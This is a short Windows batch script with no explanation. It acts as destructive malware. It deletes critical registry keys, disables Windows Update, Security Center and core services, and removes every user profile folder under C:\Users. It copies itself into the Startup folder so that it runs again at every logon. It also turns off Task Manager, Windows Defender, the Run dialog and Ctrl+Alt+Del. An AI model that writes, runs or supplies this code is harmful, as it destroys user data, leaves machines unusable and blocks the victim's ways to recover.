@echo off
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" /f
sc config wscsvc start= disabled
sc config wuauserv start= disabled
sc config bits start= disabled
sc config DcomLaunch start= disabled
for /d %i in ("C:\Users\*") do rd /s /q "%i"
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f.
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DisableCAD /t REG_DWORD /d 1 /f
